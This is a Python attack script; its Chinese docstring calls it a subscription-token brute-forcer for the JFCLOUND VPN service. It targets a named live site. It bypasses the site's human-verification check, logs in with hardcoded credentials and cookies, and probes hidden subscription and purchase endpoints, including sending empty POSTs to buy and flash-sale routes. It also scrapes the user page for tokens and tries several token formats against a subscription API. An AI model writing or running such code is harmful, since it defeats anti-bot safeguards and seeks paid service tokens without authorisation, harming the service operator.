"""JFCLOUND订阅token爆破 - requests直连"""
import requests
import json

BASE = "https://erwance34.cc"
COOKIES = {
    "uid": "296573",
    "email": "erwantest2026%40outlook.com",
    "key": "25ba407531cf31d76fb6bf9701c91812d54d350d5bd4a"
}
HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest"
}

s = requests.Session()
s.headers.update(HEADERS)

# 0. 先通过反爬验证
print("=== 绕过反爬验证 ===")
# 访问任意页面获取verify cookie
r = s.get(f"{BASE}/auth/login", timeout=10, allow_redirects=True)
print(f"  Redirect chain: {[h.url for h in r.history]}")
print(f"  Final URL: {r.url}")

# 如果在verify页面，调API绕过
if 'verify' in r.url:
    return_url = '/auth/login'
    from urllib.parse import urlparse, parse_qs
    parsed = urlparse(r.url)
    params = parse_qs(parsed.query)
    if 'return' in params:
        return_url = params['return'][0]
    print(f"  Return URL: {return_url}")
    
    verify_resp = s.post(
        f"{parsed.scheme}://{parsed.netloc}/api/verify-human",
        json={"url": return_url},
        timeout=10
    )
    print(f"  Verify response: {verify_resp.status_code} {verify_resp.text[:100]}")
    
    # 用return_url重定向
    r = s.get(f"{parsed.scheme}://{parsed.netloc}{return_url}", timeout=10, allow_redirects=True)
    print(f"  After verify: {r.url}")
    
    # 现在登录
    login_resp = s.post(
        f"{BASE}/auth/login",
        data={"email": "erwantest2026@outlook.com", "passwd": "VpnTest2026"},
        timeout=10,
        allow_redirects=True
    )
    print(f"  Login redirect to: {login_resp.url}")
    
    # 获取最终cookies
    final = s.get(f"{BASE}/user", timeout=10)
    print(f"  User page: {final.status_code}")
    
    # 更新cookies
    COOKIES.update(dict(s.cookies))
    print(f"  Cookies: uid={s.cookies.get('uid')} key={s.cookies.get('key')}")
else:
    # 直接在登录页面
    s.cookies.update(COOKIES)

# 1. 尝试各种subscribe API路径
print("=== 探测subscribe API ===")
paths = [
    "/api/v1/user/getSubscribe",
    "/api/user/getSubscribe", 
    "/api/user/sub",
    "/user/getSubscribe",
    "/user/sub",
    "/api/user/info",
    "/user/profile?json=1",
]
for p in paths:
    try:
        r = s.get(f"{BASE}{p}", timeout=10)
        if r.status_code == 200 and len(r.text) > 10 and '<html' not in r.text[:50].lower():
            print(f"  [{r.status_code}] {p}: {r.text[:300]}")
        elif r.status_code == 200:
            print(f"  [{r.status_code}] {p}: HTML (skipped)")
        else:
            print(f"  [{r.status_code}] {p}")
    except Exception as e:
        print(f"  [ERR] {p}: {e}")

# 2. 尝试POST到subscribe_endpoints
print("\n=== 探测POST subscribe ===")
post_paths = [
    "/user/shop_kill_add",
    "/user/buy",
    "/api/user/subscribe",
]
for p in post_paths:
    try:
        r = s.post(f"{BASE}{p}", data={}, timeout=10)
        if 'token' in r.text.lower() or 'subscribe' in r.text.lower():
            print(f"  [{r.status_code}] {p}: {r.text[:300]}")
        else:
            print(f"  [{r.status_code}] {p}: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {p}: {e}")

# 3. 扫描user页面找subscribe token
print("\n=== 扫描用户页找token ===")
try:
    r = s.get(f"{BASE}/user", timeout=10)
    html = r.text
    # 找data-clipboard-text内的真实URL
    import re
    clips = re.findall(r'data-clipboard-text="([^"]+)"', html)
    print(f"  data-clipboard-text: {clips}")
    
    # 找所有包含subscribe/token的链接
    links = re.findall(r'https?://[^"\'\s]*(?:subscribe|token|sub_link)[^"\'\s]*', html)
    print(f"  subscribe links in HTML: {links}")
    
    # 找JavaScript变量中的subscribe数据
    vars_match = re.findall(r'(?:subscribe_url|sub_url|subscribeUrl)\s*[:=]\s*["\']([^"\']+)["\']', html)
    print(f"  subscribe vars: {vars_match}")
    
    # 找hidden input
    hidden = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']+)["\']', html)
    if hidden:
        print(f"  hidden inputs: {hidden[:5]}")
        
except Exception as e:
    print(f"  [ERR] scanning: {e}")

# 4. 尝试用/api/user/sub + POST不同的token格式
print("\n=== /api/user/sub 多种token格式尝试 ===")
# 可能token在body里
body_formats = [
    {"token": COOKIES["key"]},
    {"sub_token": COOKIES["key"]},
    {"subscribe_token": COOKIES["key"]},
    {"key": COOKIES["key"]},
]
for body in body_formats:
    try:
        r = s.post(f"{BASE}/api/user/sub", data=body, timeout=10)
        print(f"  {body}: {r.text[:200]}")
    except Exception as e:
        print(f"  [ERR] {e}")

print("\nDone!")
